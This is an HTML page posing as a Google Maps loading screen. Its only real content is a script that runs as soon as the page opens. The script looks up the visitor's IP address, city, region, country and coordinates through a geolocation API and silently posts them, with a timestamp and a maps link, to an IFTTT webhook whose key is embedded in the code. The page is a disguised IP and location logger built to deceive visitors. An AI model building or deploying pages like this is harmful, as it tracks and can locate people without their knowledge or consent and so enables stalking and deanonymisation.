<!DOCTYPE html>
<html>
<head>
  <title>Google Maps</title>
</head>
<body>
  <h1>Loading Google Maps...</h1>

  <script>
    async function logVisitor() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        const ip = data.ip || "No IP";
        const city = data.city || "No city";
        const region = data.region || "No region";
        const country = data.country_name || "No country";
        const lat = data.latitude || "0";
        const lon = data.longitude || "0";
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const timestamp = new Date().toLocaleString();
        const location = `${ip} â€” ${city}, ${region}, ${country}`;

        await fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            value1: location,
            value2: mapsLink,
            value3: timestamp
          })
        });

      } catch (err) {
        console.error("Logging failed:", err);
      }
    }

    logVisitor();
  </script>
</body>
</html>
